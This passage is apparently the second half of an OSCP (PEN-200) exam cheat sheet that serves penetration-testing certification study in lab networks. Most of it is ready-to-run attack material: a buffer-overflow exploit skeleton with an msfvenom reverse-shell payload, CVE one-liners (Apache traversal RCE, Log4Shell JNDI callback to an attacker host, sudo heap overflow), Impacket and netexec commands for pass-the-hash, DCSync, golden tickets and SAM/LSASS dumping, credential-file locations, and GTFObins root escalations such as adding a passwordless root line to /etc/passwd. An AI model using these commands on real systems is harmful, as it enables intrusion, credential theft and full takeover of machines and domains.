# In Immunity Debugger:
# !mona findmsp -distance <CRASH_LENGTH>
# Note the EIP offset value

# ── Step 3: Verify EIP Control ───────────────────────────────
# payload = b"A" * OFFSET + b"B" * 4 + b"C" * (2000 - OFFSET - 4)
# EIP should = 42424242

# ── Step 4: Bad Chars ────────────────────────────────────────
# \x00 always bad; test all others
# !mona bytearray -b "\x00"
# Send all chars; compare in Immunity hex dump to mona bytearray
# !mona compare -f C:\mona\bytearray.bin -a <ESP_ADDRESS>

# ── Step 5: JMP ESP ──────────────────────────────────────────
# !mona jmp -r esp -cpb "\x00\x0a\x0d"  (add your bad chars)
# Pick address from module with no ASLR/DEP/SafeSEH/Rebase

# ── Step 6: Shellcode ────────────────────────────────────────
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 \
    -f python -b "\x00\x0a\x0d" EXITFUNC=thread
# EXITFUNC=thread keeps the service running

# ── Step 7: Final Exploit ────────────────────────────────────
from struct import pack

offset   = <OFFSET_VALUE>
jmp_esp  = pack("<I", <JMP_ESP_ADDRESS>)  # little-endian
nops     = b"\x90" * 16
# Paste msfvenom buf here as shellcode

payload = b"A" * offset + jmp_esp + nops + shellcode
```

---

## 12. COMMON CVEs & EXPLOITS

### High-Value CVE Quick Reference

```
CVE / EXPLOIT        TARGET                    IMPACT
─────────────────────────────────────────────────────────────────
MS17-010 EternalBlue Win7/2008 R2 (SMB v1)   → SYSTEM
  nmap: smb-vuln-ms17-010; manual: helperlibs; msf: ms17_010

CVE-2019-0708 BlueKeep  Win7/2008 RDP        → RCE/SYSTEM
  msf: cve_2019_0708_bluekeep_rce (unstable)

CVE-2021-41773       Apache 2.4.49 PATH traversal → RCE
  curl 'http://<IP>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'echo;id'

CVE-2021-42013       Apache 2.4.50 (bypass of above)
  curl 'http://<IP>/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh' -d 'echo;id'

CVE-2021-3156 Baron  sudo <1.9.5p2             → local root
  sudoedit -s '\' $(python3 -c 'print("A"*65536)')

CVE-2021-4034 PwnKit pkexec all distros        → local root
  https://github.com/ly4k/PwnKit

CVE-2022-0847 DirtyPipe kernel 5.8-5.16.11    → local root
  write to read-only files → overwrite /etc/passwd

CVE-2016-5195 DirtyCow kernel <4.8.3           → local root

CVE-2021-44228 Log4Shell  Log4j 2.x Java       → RCE
  ${jndi:ldap://<LHOST>:1389/a} in any logged header

CVE-2021-1675/34527 PrintNightmare  Win2019/10 → SYSTEM/RCE
  SharpPrintNightmare.exe \\<IP> C:\path\to\payload.dll

CVE-2022-26134 Confluence 7.4.17 OGNL injection → RCE
  curl 'http://<IP>/%24%7B%40com.opensymphony.xwork2.ActionContext...'

CVE-2023-4966 Citrix Bleed  Citrix ADC/Gateway → session hijack
```

### SearchSploit Workflow

```bash
# Search:
searchsploit apache 2.4
searchsploit "windows smb" remote
searchsploit -w openssh 7.2    # Show Exploit-DB URL

# Copy to current dir:
searchsploit -m 47837          # Copy exploit #47837

# Examine without copying:
searchsploit -x 47837

# Update database:
searchsploit -u

# Filter by platform:
searchsploit --os windows --type webapps php
```

---

## 13. EXAM DAY TIPS

### Before Starting (15 min prep)

```
☐ VPN connected — verify routing: ping <DC_IP>
☐ Note all IPs given: DC, MS01, MS02, Box1, Box2, Box3
☐ Update /etc/hosts with all IPs (add hostnames as you find them)
☐ Create loot structure:
    mkdir -p ~/exam/{ad/{ms01,ms02,dc},box{1,2,3}}/{scans,loot,exploits,screenshots}
☐ Open notes file per machine (use CherryTree / Obsidian / Markdown)
☐ Screenshot tool ready (Flameshot: flameshot gui)
☐ Start nmap scans on ALL targets immediately
☐ Start tmux: 1 window per machine, split panes
☐ Write provided AD credentials FIRST in notes
```

### Notes Template Per Machine

```markdown
## Machine: <HOSTNAME> — <IP> — <OS>
**Status:** In Progress / Owned
**Flags:**
- local.txt:  ________________
- proof.txt:  ________________

### Ports / Services
| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 80   | HTTP    | Apache 2.4.49 | LFI vuln |

### Attack Path
1. [ ] Enumeration: gobuster → found /admin
2. [ ] LFI at ?file= parameter → /etc/passwd readable
3. [ ] Log poisoning → RCE as www-data
4. [ ] linpeas → SUID /usr/bin/python3
5. [ ] GTFObins python SUID → root

### Commands Used (copy for report)
...

### Screenshots Taken
- [ ] local.txt with IP + whoami
- [ ] proof.txt with IP + whoami
```

### Critical Exam Rules

```
☐ Screenshot format — EVERY flag must include:
    • cat /root/proof.txt (or type C:\...\proof.txt)
    • whoami (showing root / NT AUTHORITY\SYSTEM / Administrator)
    • hostname
    • ip addr / ipconfig

☐ Exact commands for screenshot:
    Linux:   cat /root/proof.txt && whoami && hostname && ip addr show
    Windows: type C:\Users\Administrator\Desktop\proof.txt & whoami & hostname & ipconfig /all

☐ Metasploit: ONLY 1 MACHINE — choose wisely
    → If stuck on standalone, use Metasploit there
    → Don't use on AD (manual AD is better documented anyway)

☐ msfvenom: ALLOWED on ALL machines (just payload generation)

☐ Screenshot IMMEDIATELY when you get a flag
    → Don't wait — connection drops happen

☐ AD set: flags may be in unusual locations — check:
    C:\Users\*\Desktop\*.txt
    C:\Users\*\Documents\*.txt
    Use: dir /s /b C:\*.txt 2>nul | findstr "local\|proof"
```

### Stuck? 15-Point Reset Checklist

```
Time limit per vector: 45 minutes. If stuck → STOP → go through this list.

☐ 1.  Did full port scan finish? (-p- not just top 1000)
☐ 2.  Did UDP scan run? (SNMP=161 especially)
☐ 3.  Read ALL web page source code? (Ctrl+U in browser)
☐ 4.  Checked robots.txt, /.git, /.env, /backup?
☐ 5.  Tried ALL found credentials on ALL services?
☐ 6.  Default credentials tried? (admin:admin, admin:password, user:user)
☐ 7.  Exact version numbers googled for CVEs?
☐ 8.  searchsploit run on every service+version?
☐ 9.  All SMB shares checked and files downloaded?
☐ 10. SQL injection tested on every input field?
☐ 11. LFI tested on every file/page parameter?
☐ 12. linpeas/winpeas output fully read? (especially yellow/red)
☐ 13. sudo -l, SUID, capabilities, cron all checked?
☐ 14. Interesting file search done? (.conf, .bak, history files)
☐ 15. Is there a simpler path I'm overthinking?
```

### AD-Specific Tips

```
☐ Start with provided creds → BloodHound FIRST (shows the path)
☐ Check ALL user descriptions for passwords (very common in OSCP)
☐ Check SYSVOL/GPP within first 10 minutes
☐ Kerberoast + AS-REP roast with initial creds immediately
☐ Password reuse is extremely common: found hash/pass → spray everywhere
☐ BloodHound query "Shortest Path to DA" → follow it literally
☐ Any GenericAll/WriteDACL/GenericWrite ACE → exploit immediately
☐ Check MSSQL linked servers — lateral movement via SQL is common
☐ Check if MSSQL service account has domain privileges
☐ netexec/CME --users finds more than BloodHound sometimes
☐ After owning MS01 → re-run BloodHound from inside (catches more)
```

### Common Rabbit Holes (Avoid These)

```
✗ Kernel exploits before trying any other method
✗ SSH brute force with rockyou (10M entries = too slow)
✗ Ignoring UDP entirely (SNMP community = creds/usernames)
✗ Not trying found creds on every other service
✗ Fuzzing for hours when page is static (no dynamic params)
✗ Spending >45 min on one attack vector
✗ Assuming no MSSQL linked servers without checking
✗ Forgetting PS history file (ConsoleHost_history.txt)
✗ Not checking web.config / app.config files for DB creds
✗ Giving up without trying GTFObins on EVERY SUID binary
```

---

## 14. PROOF COLLECTION CHECKLIST

### Required Screenshot Per Machine

```bash
# ── Linux local.txt (unprivileged user) ─────────────────────
cat /home/<USERNAME>/local.txt && whoami && id && hostname && ip addr show

# ── Linux proof.txt (root) ───────────────────────────────────
cat /root/proof.txt && whoami && id && hostname && ip addr show

# ── Windows local.txt (low-priv user) ───────────────────────
type C:\Users\<USERNAME>\Desktop\local.txt & whoami & hostname & ipconfig

# ── Windows proof.txt (SYSTEM / Administrator) ───────────────
type C:\Users\Administrator\Desktop\proof.txt & whoami & hostname & ipconfig /all
# If SYSTEM:
type C:\Users\Administrator\Desktop\proof.txt & whoami /all & hostname & ipconfig

# ── AD MS01 local.txt ────────────────────────────────────────
# Same as above depending on OS

# ── AD MS02 local.txt ────────────────────────────────────────
# Same as above

# ── AD DC proof.txt (Domain Admin / SYSTEM on DC) ────────────
type C:\Users\Administrator\Desktop\proof.txt & whoami & net group "Domain Admins" /domain & hostname & ipconfig
```

### Proof File Locations Reference

```
Linux:
    /root/proof.txt           ← requires root
    /home/<user>/local.txt    ← requires user access

Windows:
    C:\Users\Administrator\Desktop\proof.txt  ← requires admin/SYSTEM
    C:\Users\<user>\Desktop\local.txt         ← requires user
    Also check: Documents, root of C:\

If not found:
    Linux:  find / -name "*.txt" 2>/dev/null | xargs grep -l "OS{" 2>/dev/null
    Windows: dir /s /b C:\local.txt C:\proof.txt 2>nul
             dir /s /b C:\*.txt 2>nul | findstr "local\|proof"
```

### Final Verification Before Ending Exam

```
POINTS TRACKER:
☐ AD MS01  — local.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐
☐ AD MS02  — local.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐
☐ AD DC    — proof.txt  = 20 pts  |  Flag: ____________  | Screenshot: ☐
☐ Box1     — local.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐
☐ Box1     — proof.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐
☐ Box2     — local.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐
☐ Box2     — proof.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐
☐ Box3     — local.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐
☐ Box3     — proof.txt  = 10 pts  |  Flag: ____________  | Screenshot: ☐

TOTAL:      /100   |   PASS THRESHOLD: 70

PRE-REPORT CHECKS:
☐ All screenshots show: flag + whoami + hostname + IP
☐ Notes detailed enough to recreate each attack step
☐ All commands documented for 24hr report
☐ No Metasploit used on more than 1 machine
☐ Report started / template ready
```

---

## 15. QUICK REFERENCE CARD

### Essential Listeners

```bash
nc -lvnp 4444                         # Basic
rlwrap nc -lvnp 4444                   # With readline (better history)
# Metasploit multi/handler:
use multi/handler; set payload windows/x64/shell_reverse_tcp
set LHOST tun0; set LPORT 4444; run -j
```

### Impacket Cheatsheet

```bash
# Code execution:
psexec.py dom/user:pass@<TARGET_IP>                  # SYSTEM via SMB
wmiexec.py dom/user:pass@<TARGET_IP>                 # semi-interactive WMI
smbexec.py dom/user:pass@<TARGET_IP>                 # no binary on disk
atexec.py dom/user:pass@<TARGET_IP> "whoami"         # scheduled task exec

# Hash-based (PTH):
psexec.py dom/user@<TARGET_IP> -hashes :<NTLM_HASH>
wmiexec.py dom/user@<TARGET_IP> -hashes :<NTLM_HASH>
secretsdump.py dom/user@<TARGET_IP> -hashes :<NTLM_HASH>

# AD attacks:
GetUserSPNs.py dom/user:pass -dc-ip <DC_IP> -request      # Kerberoast
GetNPUsers.py dom/user:pass -dc-ip <DC_IP> -request        # AS-REP
secretsdump.py dom/user:pass@<DC_IP> -just-dc              # DCSync
lookupsid.py dom/user:pass@<TARGET_IP>                     # SID enum
addcomputer.py dom/user:pass -computer-name FAKE$          # add computer
getST.py -spn cifs/<TARGET_FQDN> -impersonate Admin dom/user:pass  # S4U2Self
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain dom Admin  # Golden

# MSSQL:
mssqlclient.py dom/user:pass@<TARGET_IP> -windows-auth
mssqlclient.py sa@<TARGET_IP>
```

### netexec / CME Cheatsheet

```bash
# Note: netexec (nxc) = new name for CrackMapExec (cme)
# Both work — nxc is actively maintained

nxc smb <TARGET_IP> -u user -p pass                          # Test creds
nxc smb <TARGET_IP> -u user -H <NTLM_HASH>                  # PTH
nxc smb <SUBNET>/24 -u user -p pass --continue-on-success    # Subnet spray
nxc smb <TARGET_IP> -u user -p pass --shares                 # Share enum
nxc smb <TARGET_IP> -u user -p pass --users                  # Domain users
nxc smb <TARGET_IP> -u user -p pass --groups                 # Groups
nxc smb <TARGET_IP> -u user -p pass --pass-pol               # Password policy
nxc smb <TARGET_IP> -u user -p pass --sam                    # Dump SAM
nxc smb <TARGET_IP> -u user -p pass --lsa                    # Dump LSA
nxc smb <TARGET_IP> -u user -p pass -M lsassy                # LSASS creds
nxc smb <TARGET_IP> -u user -p pass -M gpp_password          # GPP creds
nxc smb <TARGET_IP> -u user -p pass -x "whoami"              # CMD exec
nxc smb <TARGET_IP> -u user -p pass -X "whoami"              # PS exec
nxc winrm <TARGET_IP> -u user -p pass                        # Test WinRM
nxc mssql <TARGET_IP> -u sa -p pass --local-auth             # MSSQL test
nxc mssql <TARGET_IP> -u sa -p pass -q "SELECT @@version"    # MSSQL query
nxc mssql <TARGET_IP> -u sa -p pass --put-file /tmp/nc.exe C:\\Temp\\nc.exe  # Upload
```

### Key File Locations

```
LINUX — HIGH VALUE:
/etc/passwd, /etc/shadow             → hashes
/etc/crontab, /var/spool/cron/       → cron jobs
/home/*/.bash_history                → command history (GOLD)
/home/*/.ssh/id_rsa                  → private keys
/home/*/.ssh/authorized_keys         → can add your pubkey
/var/www/html/                       → web configs (DB creds!)
/opt/                                → custom apps
/tmp/, /dev/shm/                     → writable dirs
/proc/self/environ                   → environment vars

WINDOWS — HIGH VALUE:
C:\Windows\System32\config\SAM       → local hashes
C:\Windows\NTDS\ntds.dit             → AD hashes (DC)
C:\inetpub\wwwroot\web.config        → DB/app creds
C:\xampp\passwords.txt               → XAMPP creds
C:\ProgramData\                      → app configs
C:\Users\*\AppData\Local\Microsoft\Credentials\  → stored creds
%APPDATA%\...\PSReadLine\ConsoleHost_history.txt  → PS history (GOLD)
C:\Windows\Panther\unattend.xml      → autologon creds
C:\Windows\system32\sysprep\sysprep.xml → creds
```

### GTFObins Quick Reference

```bash
# Check: https://gtfobins.github.io/

# Common SUID/sudo escalations:
find      → sudo find . -exec /bin/bash \; -p
python3   → python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
perl      → perl -e 'exec "/bin/bash"'
ruby      → ruby -e 'exec "/bin/bash"'
awk       → awk 'BEGIN {system("/bin/bash")}'
nmap      → sudo nmap --interactive; !sh  (old nmap <5.20)
vim       → sudo vim -c ':!/bin/bash'
less      → sudo less /etc/hosts → !/bin/bash
man       → sudo man man → !/bin/bash
tar       → sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
env       → sudo env /bin/bash
tee       → echo 'root2::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd
cp        → sudo cp /bin/bash /tmp/; sudo chmod +s /tmp/bash; /tmp/bash -p
```

---

> **REMEMBER:**
> AD Set = Assumed Breach → Use provided creds immediately  
> MSSQL → Always check xp_cmdshell + linked servers + UNC injection  
> BloodHound shows the path → follow it  
> Password reuse wins exams  
> Screenshot every flag before moving on  
>
> *PEN-200 v24+ | 2025-26 Edition | Enumerate everything. Try harder.*
